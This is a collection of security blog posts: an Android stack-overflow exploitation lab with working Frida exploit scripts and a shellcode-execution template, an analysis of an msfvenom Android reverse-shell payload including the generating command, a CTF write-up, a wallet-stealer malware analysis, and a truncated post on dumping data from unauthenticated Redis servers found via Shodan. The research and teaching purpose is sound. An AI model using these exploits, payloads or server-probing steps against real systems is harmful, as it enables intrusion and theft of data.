[{"categories":null,"content":"My journey into Android exploitation at the binary level started with a deep passion for the subject. I was determined to simplify the process as much as possible, but it turned out to be quite challenging. In this post, you\u0026rsquo;ll learn various aspects of Android exploitation, including:\nHow to use the NDK to write an application. How to create a vulnerable lab environment for demonstrating Stack Overflow vulnerabilities. How to exploit Stack Overflow in Android binaries. How to Debug an Android Native Binary Remotely with GDB A deep dive into the capabilities of Frida! I conducted all the steps in this post on an x86 Android emulator (Genymotion).\nWhy Frida? You might wonder why I used Frida. There were two main reasons:\nPassion: I absolutely love working with Frida! Practicality: I couldn\u0026rsquo;t find another way to send my binary data for overriding the EIP. I hope you find this content innovative and insightful.\nCreating the Vulnerable Application Implementing Graphical User Interface The first step in creating our vulnerable application is to edit the style of the MainActivity. The goal here is to set up an interface that allows us to input data for buffer exploitation and includes a button to submit the value. Below is the XML code for activity_main.xml:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;LinearLayout xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; xmlns:tools=\u0026#34;http://schemas.android.com/tools\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:orientation=\u0026#34;vertical\u0026#34; tools:context=\u0026#34;.MainActivity\u0026#34;\u0026gt; \u0026lt;EditText android:id=\u0026#34;@+id/user_input\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:hint=\u0026#34;Enter input\u0026#34; /\u0026gt; \u0026lt;Button android:id=\u0026#34;@+id/exploit_button\u0026#34; android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;Exploit\u0026#34; /\u0026gt; \u0026lt;TextView android:id=\u0026#34;@+id/result_text\u0026#34; android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;Result will be shown here\u0026#34; /\u0026gt; \u0026lt;/LinearLayout\u0026gt; Implementing Vulnerable Native C++ Code To introduce a vulnerability, we\u0026rsquo;ll use native C++ code that is susceptible to a stack overflow.\nBelow, I\u0026rsquo;ve defined three functions, starting with the main function. This function simply returns the user input value.\nHere\u0026rsquo;s the C++ code for the main function:\nextern \u0026#34;C\u0026#34; JNIEXPORT jstring JNICALL Java_com_example_myapplication_MainActivity_stringFromJNI( JNIEnv* env, jobject, jstring input) { const char* inputCStr = env-\u0026gt;GetStringUTFChars(input, nullptr); kousha(inputCStr); env-\u0026gt;ReleaseStringUTFChars(input, inputCStr); return env-\u0026gt;NewStringUTF(inputCStr); } The second function in our vulnerable native C++ code is kousha. This function is called by Java_com_example_myapplication_MainActivity_stringFromJNI and is responsible for copying the user input characters one by one into a fixed-size buffer.\nBelow is the C++ code for the kousha function:\nint kousha(const char* inputCStr) { char buffer[10]; const char *p1 = inputCStr; char *p2 = buffer; while (1) { *p2 = *p1; if (*p1 == 0) { break; } p1 = p1 + 1; p2 = p2 + 1; } return 0; } Implementing the getSecret Function The final piece of our vulnerable application is the Java_com_example_myapplication_MainActivity_getSecret function. The goal of this lab is to exploit the stack overflow and override the EIP register to call this function. When successfully called, this function will log \u0026ldquo;Yeah!\u0026rdquo; in the adb logcat output.\nBefore diving into the function itself, don\u0026rsquo;t forget to define the logging macro at the beginning of your C++ file:\n#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__) Here\u0026rsquo;s the C++ code for the getSecret function:\nextern \u0026#34;C\u0026#34; JNIEXPORT jstring JNICALL Java_com_example_myapplication_MainActivity_getSecret( JNIEnv* env, jobject) { std::string hello = \u0026#34;Yeah!\u0026#34;; LOGI(\u0026#34;%s\u0026#34;, hello.c_str()); return env-\u0026gt;NewStringUTF(hello.c_str()); } Code Explanation: Logging Setup: The macro LOGI is defined to log informational messages to the Android logcat. This is essential for seeing the \u0026ldquo;Yeah!\u0026rdquo; message in the log output. Function Declaration: Like the previous functions, this one is declared with extern \u0026quot;C\u0026quot; to ensure proper linkage for JNI. Logging the Message: The function logs the string \u0026ldquo;Yeah!\u0026rdquo; to the adb logcat using the LOGI macro. Returning the String: Finally, the function returns the \u0026ldquo;Yeah!\u0026rdquo; string as a new jstring back to the Java layer. Exploit Goal: The goal of this lab is to craft an exploit that causes the kousha function\u0026rsquo;s stack overflow to override the EIP register, redirecting execution to the getSecret function. When successful, you’ll see \u0026ldquo;Yeah!\u0026rdquo; logged in the adb logcat output, confirming that the exploit worked.\nFull Code for Vulnerable Native C++ Functions Below is the complete C++ code for the vulnerable native functions used in our Android application. This code includes logging macros, the vulnerable kousha function, and the getSecret function, which we aim to call via an exploit.\n#include \u0026lt;jni.h\u0026gt; #include \u0026lt;string\u0026gt; #include \u0026lt;android/log.h\u0026gt; #define LOG_TAG \u0026#34;MyApplication\u0026#34; #define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__) #define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__) int kousha(const char* inputCStr) { char buffer[10]; const char *p1 = inputCStr; char *p2 = buffer; while (true) { *p2 = *p1; if (*p1 == 0) { break; } p1 = p1 + 1; p2 = p2 + 1; } return 0; } extern \u0026#34;C\u0026#34; JNIEXPORT jstring JNICALL Java_com_example_myapplication_MainActivity_stringFromJNI( JNIEnv* env, jobject, jstring input) { const char* inputCStr = env-\u0026gt;GetStringUTFChars(input, nullptr); kousha(inputCStr); env-\u0026gt;ReleaseStringUTFChars(input, inputCStr); return env-\u0026gt;NewStringUTF(inputCStr); } extern \u0026#34;C\u0026#34; JNIEXPORT jstring JNICALL Java_com_example_myapplication_MainActivity_getSecret( JNIEnv* env, jobject) { std::string hello = \u0026#34;Yeah!\u0026#34;; LOGI(\u0026#34;%s\u0026#34;, hello.c_str()); return env-\u0026gt;NewStringUTF(hello.c_str()); } Modifying CMakeLists.txt for Security Settings and Library Inclusion To set up our build environment for the vulnerable application, we need to modify the CMakeLists.txt file. This involves disabling the FORTIFY security feature and adding the native-lib library.\nHere is the updated CMakeLists.txt configuration:\ncmake_minimum_required(VERSION 3.22.1) project(\u0026#34;myapplication\u0026#34;) # Add the native-lib library add_library(native-lib SHARED native-lib.cpp) # Set compiler flags to disable security features and enable debugging set(CMAKE_CXX_FLAGS \u0026#34;${CMAKE_CXX_FLAGS} -fno-stack-protector -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=0 -O0 -g\u0026#34;) # Link the native-lib library with Android and log libraries target_link_libraries(native-lib android log) Build and run the project now.\nExploiting Stack Overflow Now it\u0026rsquo;s time to trigger a crash. We\u0026rsquo;ll send an excessive number of characters to cause a buffer overflow and crash the app. Send the following input to trigger the buffer overflow:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nNow that we know the application is vulnerable, use the cyclic function from the pwntools Python framework to determine the amount of data needed to reach and override the EIP register.\nWe observed that the fault address is 0x61656161, which corresponds to the last value of EIP when the app crashes.\nNow, we can determine the offset needed to override the EIP register and execute our getSecret function.\nEverything has been smooth so far, but we\u0026rsquo;re about to hit a challenging part. Grab a cup of coffee and let\u0026rsquo;s dive in.\nEven if we have the address of the getSecret function, passing it as a text input could be tricky. We might explore using Unicode characters, though their effectiveness is uncertain. That\u0026rsquo;s why I\u0026rsquo;m turning to Frida for a solution.\nBefore we dive into Frida, let\u0026rsquo;s complete the final step of our current task. We\u0026rsquo;ll use GDB for remote debugging to confirm that the EIP register has been successfully overwritten.\nI’ve set up gdbserver on the Android device and attached it to the vulnerable application with the following command:\n./gdbserver :7777 --attach $(ps | grep myapp | awk \u0026#39;{print $2}\u0026#39;) I then forwarded port 7777 from the Android device to my host using:\nadb forward tcp:7777 tcp:7777 Next, I started GDB and connected to the remote application using:\ntarget remote :7777 The application is currently stopped. Set a breakpoint on the kousha function using the following GDB command:\nb *kousha Then, use the c command to continue execution:\nc I used aaaaaaaaaaaaaabcde as the input. This consists of 14 \u0026lsquo;a\u0026rsquo; characters to reach the offset and bcde to overwrite the EIP register. The breakpoint will be hit, and GDB will stop at the first instruction of the kousha function. You can view the next 30 instructions with:\nx/30i $eip You might see a jmp instruction creating a loop that corresponds to the while loop in the kousha function. Set a breakpoint after the loop and continue debugging.\nUse the ni (next instruction) command in GDB to step through the instructions one by one. After executing the pop ebp instruction, the ebp register will show aaaa.\nWhen the ret instruction is executed, the eip register will be set to bcde.\nWe successfully overwrote the EIP register with the value bcde. Now, the goal is to override it with the address of our getSecret function. To do this, let\u0026rsquo;s dive into Frida.\nI’ve set up the Frida Server on the Android Emulator, enabling us to connect to it. The plan involves three steps:\nFind the Base Address of the getSecret Function. Craft a Payload (offset + *getSecret). Send the Payload as User Input to Trigger the Overflow. However, it\u0026rsquo;s not as straightforward as it sounds. After trying several methods to modify the user input, I found that hooking GetStringUTFChars was the most effective approach. So, we\u0026rsquo;ll hook GetStringUTFChars from the libnative-lib.so library.\nFor additional learning, I\u0026rsquo;ve included some extra code to explore Frida\u0026rsquo;s capabilities, such as finding the base address of a library using Module.findBaseAddress(\u0026quot;libname.so\u0026quot;).\nHere\u0026rsquo;s the Frida script:\nvar libnative_lib_so = \u0026#39;libnative-lib.so\u0026#39;; function start_timer_for_intercept() { setTimeout(function() { console.log(\u0026#34;[+] \u0026#34; + libnative_lib_so + \u0026#34; Base Address -\u0026gt; \u0026#34; + Module.findBaseAddress(libnative_lib_so)); var offset_of_GetStringUTFChars = 0x51110; var dynamic_address_of_GetStringUTFChars = Module.findBaseAddress(libnative_lib_so).add(offset_of_GetStringUTFChars); Interceptor.attach(dynamic_address_of_GetStringUTFChars, { onLeave: function(retval) { var uInput = retval.readCString(); if (uInput == \u0026#34;exploit\u0026#34;) { console.log(\u0026#34;We are done!\u0026#34;); } } }); }, 2000); } start_timer_for_intercept(); Explanation: Finding the Base Address: The base address of libnative-lib.so is retrieved and logged. Offset Calculation: We calculate the dynamic address of GetStringUTFChars by adding its offset to the base address. Hooking GetStringUTFChars: We use Frida\u0026rsquo;s Interceptor.attach to hook the GetStringUTFChars function. If the user input matches \u0026ldquo;exploit\u0026rdquo;, it confirms that the hook is working as expected. This setup allows us to intercept and modify the input before it\u0026rsquo;s used in the vulnerable function, helping us to overwrite the EIP with the getSecret address.\nNow, let\u0026rsquo;s craft our payload. We need 14 bytes as an offset to reach the EIP register, followed by the base address of the getSecret function. However, there\u0026rsquo;s a crucial detail: in our previous code, we only used console.log(). To exploit the vulnerability, we need to return an address as the retval. This requires allocating space in the heap.\nBelow is the code that does this:\nvar libnative_lib_so = \u0026#39;libnative-lib.so\u0026#39;; function start_timer_for_intercept() { setTimeout(function() { // Find the base address of the library console.log(\u0026#34;[+] \u0026#34; + libnative_lib_so + \u0026#34; Base Address -\u0026gt; \u0026#34; + Module.findBaseAddress(libnative_lib_so)); var offset_of_GetStringUTFChars = 0x51110; // Replace with the actual offset var dynamic_address_of_GetStringUTFChars = Module.findBaseAddress(libnative_lib_so).add(offset_of_GetStringUTFChars); // Allocate space in the heap for our payload var memoryForPayload = Memory.alloc(100); // Craft the payload: 14 \u0026#39;A\u0026#39;s (0x41) followed by \u0026#39;B\u0026#39;s (0x42) to overwrite EIP var payload = [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41]; payload.push(0x42, 0x42, 0x42, 0x42); // Write the payload into the allocated memory Memory.writeByteArray(memoryForPayload, payload); // Hook the GetStringUTFChars function and replace the return value with our payload Interceptor.attach(dynamic_address_of_GetStringUTFChars, { onLeave: function(retval) { var uInput = retval.readCString(); if (uInput == \u0026#34;exploit\u0026#34;) { retval.replace(memoryForPayload); // Replace retval with our crafted payload console.log(\u0026#34;We are done!\u0026#34;); } } }); }, 2000); } start_timer_for_intercept(); Explanation: Memory Allocation:\nMemory.alloc(100): Allocates 100 bytes in the heap for our payload. Crafting the Payload:\npayload = [0x41, \u0026hellip;]: Fills the first 14 bytes with 0x41 (\u0026lsquo;A\u0026rsquo;) to reach the EIP register. payload.push(0x42, 0x42, 0x42, 0x42): Adds 0x42 (\u0026lsquo;B\u0026rsquo;) to overwrite the EIP register. Replacing the Return Value:\nretval.replace(memoryForPayload): Replaces the original return value of GetStringUTFChars with our crafted payload. This code will modify the user input to include the crafted payload, allowing us to overwrite the EIP register and execute the getSecret function.\nNow that we’ve identified how to trigger the overflow, it’s time to execute the real exploit: overriding the EIP register with the address of the getSecret function.\nHere\u0026rsquo;s the process:\nFind the Base Address of getSecret:\nWe use Module.findExportByName() to locate the base address of the getSecret function within the libnative-lib.so library. Convert the Address:\nAfter finding the address, we convert it to a hexadecimal format suitable for the EIP register. Adjust for Endianness:\nThe address is pushed in reverse order due to endianness, which ensures the correct function call. Execute the Exploit:\nFinally, we hook the GetStringUTFChars function to replace the user input with our crafted payload, which includes the address of getSecret. var libnative_lib_so = \u0026#39;libnative-lib.so\u0026#39;; function start_timer_for_intercept() { setTimeout(function() { console.log(\u0026#34;[+] \u0026#34; + libnative_lib_so + \u0026#34; Base Address -\u0026gt; \u0026#34; + Module.findBaseAddress(libnative_lib_so)); var offset_of_GetStringUTFChars = 0x51110; // Offset for GetStringUTFChars var dynamic_address_of_GetStringUTFChars = Module.findBaseAddress(libnative_lib_so).add(offset_of_GetStringUTFChars); // Allocate memory for the payload var memoryForPayload = Memory.alloc(100); var payload = [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41]; // Find the address of getSecret var getSecret = Module.findExportByName(\u0026#34;libnative-lib.so\u0026#34;, \u0026#34;Java_com_example_myapplication_MainActivity_getSecret\u0026#34;); var getSecretAddr = getSecret.toString().match(/[\\s\\S]{1,2}/g) || []; // Push the getSecret address in reverse order due to endianness payload.push(parseInt(getSecretAddr[4], 16), parseInt(getSecretAddr[3], 16), parseInt(getSecretAddr[2], 16), parseInt(getSecretAddr[1], 16)); Memory.writeByteArray(memoryForPayload, payload); // Hook GetStringUTFChars and replace the return value with our crafted payload Interceptor.attach(dynamic_address_of_GetStringUTFChars, { onLeave: function(retval) { var uInput = retval.readCString(); if (uInput == \u0026#34;exploit\u0026#34;) { retval.replace(memoryForPayload); // Replace retval with our crafted payload } } }); }, 2000); } start_timer_for_intercept(); Summary We first locate the getSecret function\u0026rsquo;s address using Module.findExportByName(). The address is then formatted and adjusted for system endianness. Finally, by hooking the GetStringUTFChars function, we replace the user input with a payload that includes the address of getSecret. When the payload is executed, the application logs \u0026ldquo;Yeah!\u0026rdquo; to indicate success. And just like that, we’ve successfully exploited the application to call the getSecret function!\nBonus If you\u0026rsquo;re interested in writing and executing shellcode in memory—like a reverse shell—this section will guide you through the process. The steps include writing the shellcode, allocating memory for it, changing the allocated memory\u0026rsquo;s permissions to make it executable, and then writing the shellcode into that memory.\nSteps to Execute Shellcode:\nWrite Your Shellcode:\nFirst, craft your shellcode. This could be something like a reverse shell. Allocate Memory:\nAllocate memory for your shellcode, ensuring it\u0026rsquo;s large enough to hold the shellcode and any additional data. Change Memory Permissions:\nModify the permissions of the allocated memory region to make it executable. Write Shellcode into Memory:\nWrite the shellcode into the allocated memory. Verify with hexdump():\nUse hexdump() to inspect the memory where the shellcode is located and ensure everything is as expected. var libnative_lib_so = \u0026#39;libnative-lib.so\u0026#39;; function start_timer_for_intercept() { setTimeout(function() { console.log(\u0026#34;[+] \u0026#34; + libnative_lib_so + \u0026#34; Base Address -\u0026gt; \u0026#34; + Module.findBaseAddress(libnative_lib_so)); var offset_of_GetStringUTFChars = 0x51110; // Offset for GetStringUTFChars var dynamic_address_of_GetStringUTFChars = Module.findBaseAddress(libnative_lib_so).add(offset_of_GetStringUTFChars); // Allocate memory for the payload var memoryForPayload = Memory.alloc(100); var payload = [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41]; // Write your shellcode here var shellcode = [YOUR_SHELLCODE_GOES_HERE]; var memoryForShellcode = Memory.alloc(shellcode.length + 20); // Change memory permissions to make it executable Memory.protect(ptr(memoryForShellcode), shellcode.length + 20, \u0026#39;rwx\u0026#39;); // Write the shellcode into the allocated memory Memory.writeByteArray(memoryForShellcode, shellcode); // Extract the shellcode address and adjust for endianness var shellcodeAddress = memoryForShellcode.toString().match(/[\\s\\S]{1,2}/g) || []; payload.push(parseInt(shellcodeAddress[4], 16), parseInt(shellcodeAddress[3], 16), parseInt(shellcodeAddress[2], 16), parseInt(shellcodeAddress[1], 16)); Memory.writeByteArray(memoryForPayload, payload); // Log the memory contents for verification console.log(hexdump(memoryForShellcode, { length: 128 })); // Hook GetStringUTFChars and replace the return value with our crafted payload Interceptor.attach(dynamic_address_of_GetStringUTFChars, { onLeave: function(retval) { var uInput = retval.readCString(); if (uInput == \u0026#34;exploit\u0026#34;) { retval.replace(memoryForPayload); // Replace retval with our crafted payload } } }); }, 2000); } start_timer_for_intercept(); Summary Memory Allocation: We allocate memory and change its permissions to allow execution. Shellcode Injection: The shellcode is injected into the allocated memory. Execution: The script is set up to replace the return value of GetStringUTFChars with the payload that includes the shellcode. Verification: Use hexdump() to inspect the shellcode in memory and ensure it\u0026rsquo;s correctly placed. This approach demonstrates how to write and execute shellcode directly in memory using Frida.\n","permalink":"http://localhost:1313/posts/2024/android-stack-overflow-exploitation-with-frida/","tags":["Android","Exploitation","ExploitDevelopment","ReverseEngineering","Frida"],"title":"Exploring Android Exploitation: A Journey into Stack Overflow Vulnerability"},{"categories":null,"content":"MSFVenom is one of the most popular frameworks to create payloads, shellcodes, etc. I want to analyze a little bit of MSFVenom Android payload. So\n🎬 Part 1 - Creating an Android payload with MSFVenom Run your Kali Linux distribution (I use vagrant kalilinux/rolling box) and open a terminal.\n# Installing Kali Linux Box vagrant box add kalilinux/rolling # Create a Kali Linux VM mkdir -p /home/$USER/Desktop/vagrantmachines/kali cd /home/$USER/Desktop/vagrantmachines/kali vagrant init kalilinux/rolling # Set Kali Network to Bridge # Add below line into Vagrantfile file below config.vm.box = \u0026#34;kalilinux/rolling\u0026#34; config.vm.network \u0026#34;public_network\u0026#34; # Save and Exit from Vagrantfile # Execute Kali Machine vagrant up # SSH to Kali Machine vagrant ssh # If you want to turn it off just execute the below command after you exit from SSH vagrant halt Simply execute the below command.\nmsfvenom -p android/meterpreter/reverse_tcp LHOST=$(ip addr show eth0 | grep -Po \u0026#39;inet \\K[\\d.]+\u0026#39;) LPORT=1337 \u0026gt; malicious.apk -p: choosing payload LHOST: listener IP address (C2) LPORT: listener Port number (C2) \u0026gt; malicious.apk: output of executed command (attacker payload) After that, I copy malicious.apk to /vagrant which let me access it from my computer.\ncp malicious.apk /vagrant 🎬 Part 2 - Static Analysis with Jadx-Gui Now I have malicious.apk besides Vagrantfile. Let\u0026rsquo;s start with static analysis. Open it with the jadx-gui. Let\u0026rsquo;s see what AndroidManifest.xml does have for us.\nWe have an activity called MainActivity (package: com.metasploit.stage) which is our first activity that\u0026rsquo;ll execute.\nWe can also see there is a BroadcastReceiver with android.intent.action.BOOT_COMPLETED action. It is obvious that this malware use this permission to execute itself after restarting mobile.\nLet\u0026rsquo;s have a look at MainActivity. It simply calls startService() method from MainService class.\nMainService class extended (inherited) from Service, so it\u0026rsquo;s a service that we are dealing with.\nIn this method again startService function is called, but as we said we are in a service and it calls MainService.class in Intent().\npublic static void startService(Context context) { context.startService(new Intent(context, MainService.class)); } So this time onStartCommand() method will call. onStartCommand() is called every time a client starts the service using startService(Intent intent).\nThis method, calls start() from Payload class. Now let\u0026rsquo;s go deeper and see what the start() method does.\nstart() function calls startInPath() function, and startInPath() function calls e().start() that lead us to analyse that class and method.\nThere is nothing but execute the main() method from the Payload class again. We have to back to where we were and analyze the main() function.\nIt\u0026rsquo;s a huge function that can\u0026rsquo;t even fit in one screenshot. We can see there is a Socket socket which indicates we are dealing with a socket connection that\u0026rsquo;s probably attacker C2. Also there is a line contains a a2 = b.a(a);. It passes a variable to b.a() method and save results in a2. Left-click on the a parameter and press d on your keyboard (that is a shortcut to get you where the variable is declared).\nIt seems a huge array which i guess it can be an IP address or an URL. To make sure of this, I go to b.a() method.\nAgain it\u0026rsquo;s a huge function, but this is obvious it decrypts that array. I don\u0026rsquo;t want to waste my time and try to understand that algorithm, I\u0026rsquo;ll deal with it in the dynamic analysis part. But we have to figure out where it stores the decrypted data. You can see gVar everywhere in this function.\nIf you open the g class, you can see there is nothing but a bunch of variables. Now I\u0026rsquo;m sure it stores the decrypted data in that class\u0026rsquo;s variables.\nIn the Payload.main(), after that decryption method, we can see bunch of while(){}, try{} and if(){}.\nTake a look at where I pointed (ofc with a red arrow).\nYou can see we have a socket.getOutputStream() there that passed to a(). If you go to where a() declared, you see there\u0026rsquo;s getClassLoader(). This method let you load the Dex file dynamically. It uses to bypass AV, and it makes APK file size smaller.\nOverall, this APK file connects to attacker C2 (MSFVenom) and downloads a Dex (or JAR) file, loads it and after that, it will be deleted. Now Let\u0026rsquo;s continue our journey in the dynamic analysis part.\n🎬 Part 3 - Dynamic Analysis For the first step of dynamic analysis, I want to extract the attacker\u0026rsquo;s C2 IP address. As we saw in the static analysis, the decrypted attacker IP address is in the g class. Let\u0026rsquo;s dump data from that class. I use Android Studio to do this. But an important thing that is worth mentioning is \u0026ldquo;We have to do this quickly before anything happens and malware closes itself and runs itself as a service\u0026rdquo; because you saw it creates a service after execution. Make sure your USB Debugging is enabled.\nBut we have to do one thing more before debugging. We have to make this malicious APK debuggable. To do this as easily as possible, I do this with APKLab . The installation steps are explained in APKLab Github .\nNow open the malicious APK file with APKLab, Then Right-click on apktool.yml and Left-click on APKLab: Rebuild the APK.\nMake sure you check --debug in the opened window.\nThe rebuilt APK output file is located in the dist folder.\nUse adb to install the rebuilt APK file.\nadb install rebuilt-malicious.apk Now let\u0026rsquo;s analyze g class memory. Open Android Studio and choose Profile or Debug APK.\nNow instead of sending 10 images, I would rather make a GIF to show the process how to extract data from the g class. ⚠️ GIF file size is around 6 Mb, Just in case of any problem you can download the GIF file with this GIF URL via the wget.\nOK. We\u0026rsquo;ve successfully got the attacker\u0026rsquo;s C2 IP address. Now how we can dump that DEX which is loaded with DexClassLoader. As we know from static analysis, Malware deletes the DEX file after loading it. So we don\u0026rsquo;t have access to that anymore. We have to uninstall malware and install it again, but this time I hook the delete() method from java.io.File to disable its functionality.\nInstalling Frida\npip install frida-tools Download the latest version of frida-server from here that is compatible with your mobile CPU architecture. Installing FridaServer in your mobile.\nadb push frida-server-15.1.17-android-x86.xz /data/local/tmp adb shell Mobile #\u0026gt; cd /data/local/tmp Mobile #\u0026gt; unxz frida-server-15.1.17-android-x86.xz Mobile #\u0026gt; chmod +x frida-server-15.1.17-android-x86 Mobile #\u0026gt; ./frida-server-15.1.17-android-x86 Let\u0026rsquo;s write our hooking code (i named it hook.js) with Frida.\nJava.perform(function(){ var filecls = Java.use(\u0026#34;java.io.File\u0026#34;); filecls[\u0026#34;delete\u0026#34;].overload().implementation = function(){console.log(\u0026#34;delete() hooked!\u0026#34;); return true;} }); Now uninstall com.metasploit.stage package.\nadb uninstall com.metasploit.stage And install it again.\nadb install rebuilded-malicious.apk But this time you must use Frida to execute it.\nfrida -Uf com.metasploit.stage -l hook.js --no-pause You can see File.delete() hooked 4 times! Then use adb to download DEX \u0026amp; JAR files that are downloaded.\nI go to the files folder, there is 4 files.\nI open xz3z7c.jar with jadx-gui, It downloads met.jar and met.dex, then it loads com.metasploit.meterpreter.AndroidMeterpreter. This class loaded from met.\nLet\u0026rsquo;s open met.jar with jadx-gui.\nIt contains a lot of files and functions. It also downloads and loads another JAR file. It\u0026rsquo;s beyond of scope to analyze it in just 1 post. :) Try yourself and have a look at it. Maybe later I wrote the analysis of this JAR file.\nI hope you learned something.\n","permalink":"http://localhost:1313/posts/2022/msfvenom-android-malware-analysis/","tags":["Android","Malware","MalwareAnalysis","ReverseEngineering","MSFVenom","Metasploit"],"title":"Analyzing MSFVenom Android Payload (Malware)"},{"categories":null,"content":"Two days ago, I helped my friends to solve CTF NahamCon2022 challenges. I was wondering about Android challenges, so I focused on them. In this blog post, I\u0026rsquo;ll explain how I solved Android challenges.\nMobilize This one was an easy challenge for beginners. Anyone could solve this. :)) I opened the APK file in Jadx-GUI. There was nothing in MainActivity. So I just searched in strings.xml, and there it is. FLAG! :) Click Me I think this challenge was easy too. You just had to change a little variable in smali code. In the MainActivity, We have 3 interesting parts. It is obvious that challenges want us (in the getFlagButtonClick function [Section 2]) to click 99999999 times on something to get the flag, but also stops us being clicking after 13371337. I\u0026rsquo;m not crazy enough to click that many times. If you want to be a crazy hacker, you can just hook cookieViewClick with Frida to bypass that limit and then you are free to go by clicking 99999999 on the button. After that, the clickme native code will return the flag. But time is a matter so I\u0026rsquo;m gonna just change 99999999 to 2. :) You can do this in the smali code. So I decompiled app with the apktool and changed 0x5f5e0ff (int-\u0026gt;99999999) to 0x2 (int-\u0026gt;2). Then I build it and resigned it. Now you can just click on the cookie 2 times to get the flag. Of course, you could\u0026rsquo;ve done this by reversing the \u0026ldquo;clickme\u0026rdquo; native code, but as I said, time is a matter!\nOTPVault This application was a little bit harder, at least you had to use your brain. Challenge developed with ReactNative framework. This means you have to go for reading JavaScript and again this means, opening the index.android.bundle from the /asset folder. :) I opened index.android.bundle in Developer Console (Chromium). OK, that\u0026rsquo;s a mess. Who can even read that minified code?! you know I\u0026rsquo;m right. So I used the pretty print feature. That\u0026rsquo;s far better now. I tried to be smart and search for the flag keyword, but I just fooled myself. :)) Then I analyzed the code from the end of the script! That works a lot better. Then I found this request. There are a lot of bullshits, the real problem is those conditions (switch-case). You don\u0026rsquo;t need that n.token or even that n.s whatever it is! I used the curl command to see the result. Also, there is a /flag path. So it just says give me the damn authorization header so I did. Thanks for the Flag. :) Secure Notes This challenge difficulty was just like the OTPVault, maybe a little more tricky. The application is sick and contains 2 Main/Launcher activities! :/ BTW, the real code that we have to deal with, is in the LoginActivity. It seems we have an encrypted database. It is obvious whatever is this, It stores a flag! So let\u0026rsquo;s decrypt it. In the first red box we can see there is a function named d.k() which calls in onClick() method. Let\u0026rsquo;s see what is it! Oooh. There you are AES encryption! But we can\u0026rsquo;t see AES Mode! ECB or CBC?! Based on the Oracle documentation, the default mode is ECB. the first parameter of this function is key (str)! In LoginActivity (previous image) you can see key is this.f1583b.getText().toString(), but it repeats 4 times! AES Key is 16-byte. So it means we have to find a key that contains 4 bytes (4 characters) that will repeat 4 times (4 * 4 = 16, Duh\u0026hellip;).\nBefore writing a brute-force script for that encrypted database, I had a look at the MainActivity. It seems the decrypted data must be JSON. So I extracted db.encrypted from the /asset folder (via apktool). Then I wrote a little python script for brute force. Aaaaand Yello Flag! ","permalink":"http://localhost:1313/posts/2022/nahamcon2022-ctf-android-writeup/","tags":["Android","CTF","CaptureTheFlag","ReverseEngineering"],"title":"NahamCon CTF 2022 Android Writeup (Solutions)"},{"categories":null,"content":"As far as technology improves, hackers do their best to abuse these technologies. Android became one of the most impressive technology and it\u0026rsquo;s going further. Hackers research Android Security every moment and Android malware spread more and more. There is a lot of malware that developed till today. I want to analyze an Android malware that is a Crypto Wallet Stealer.\nI have a sample which you can download it from HERE . MD5 Checksum: 70b07a67b618a6352bf35a735645b156\nI begin the analysis with Jadx. So first I open the malware with Jadx to analyze AndroidManifest.xml.\nIt seems malware does not have many activities, services, or even permissions. We have two activities and one service. Our Main Activity that starts first is the SplashActivity, then let\u0026rsquo;s begin the analysis with that activity.\nIn the SplashActivity there\u0026rsquo;s just one thing, start a new Activity with a new thread.\nLet\u0026rsquo;s go further and analyze MainActivity. Source code is easy to read, fortunately, We don\u0026rsquo;t have to deal with obfuscation. :) In onCreate() method we got just an if statement. Let\u0026rsquo;s check the conditions.\nIn O() method, the malware checks if the accessibility feature is already enabled, and also it will start the service that is defined in AndroidManifest.xml.\nIf accessibility feature does not enabled, malware execute W() function. W() function is the interesting part which using a phishing technique (Cloak \u0026amp; Dagger) that trick the user to enable accessibility feature by himself. :) The victim thinks that he confirms he\u0026rsquo;s not a robot, but actually, he clicks on the Accessibility permission behind.\nAfter all, malware again tries to check that if statement. However, this time U() function will execute. This function uses Trust Mobile Application Package (Wallet) as a Component and starts it. If this code block fails (Trust is not installed), it will execute V() function that shows a message to the user \u0026ldquo;This application is not compatible with your device!\u0026rdquo;.\nThe MyAccessibilityService is quite interesting. This service clicks (touches) the buttons in the Trust application in the background by abusing the Accessibility feature to steal data and do actions and finally Malware developer used the Telegram bot to steal data.\n","permalink":"http://localhost:1313/posts/2022/android-trust-wallet-stealer-malware-analysis/","tags":["Android","Malware","MalwareAnalysis","ReverseEngineering"],"title":"Android Trust Wallet Stealer Malware Analysis"},{"categories":null,"content":"Last night my friend and I were Looking for some Redis NOSQL (Because Most of them do not have any authentication of course 😆) in Shodan and Censys for Bug Hunting.\nI\u0026rsquo;ve found some interesting things which led me to write this blog post.\nMost of the Redis seemed to be exploited and infected with a Miner by TeamTNT.\nI used shodan query port:6379 to find Redis services. Redis has a tool called redis-cli which lets you interact with Redis servers. I used it to connect Redis servers to find vulnerabilities and sensitive data for bug hunting reports. To connect a Redis server you can use redis-cli -h [Redis Server IP]. Redis is a Key-Value NoSQL Database that stores data in-memory, We can find information about Redis state and OS with the info command. If you want to see just the Keyspace part (Information about Keys and DBs), Use info Keyspace. It has a db0 and 4 Key. We can dump keys with DUMP, Also you can use MGET if DUMP didn\u0026rsquo;t work. (Bypass Technique?!😃) We can see there is a URL requested by cURL. I downloaded the file and used 